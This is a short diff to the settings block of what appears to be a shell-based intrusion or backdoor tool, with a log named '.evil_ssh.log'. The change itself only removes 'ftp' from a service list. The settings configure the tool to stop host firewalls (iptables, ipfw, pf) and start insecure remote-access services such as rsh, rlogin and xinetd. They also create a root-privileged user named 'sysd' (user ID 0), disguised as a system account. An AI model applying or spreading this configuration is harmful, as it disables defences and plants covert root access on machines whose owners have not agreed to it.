@@ -16,7 +16,7 @@ fi
 expectFile="connect.exp"
 errorFile=".evil_ssh.log"
 serviceStop="iptables ipfw ipf pf"
-serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs nfslock rpcbind rpcidmapd smb smbd samba rsync rsh rlogin ftp"
+serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs nfslock rpcbind rpcidmapd smb smbd samba rsync rsh rlogin"
 doServices="yes"
 newUser="sysd"
 newUserID="0"
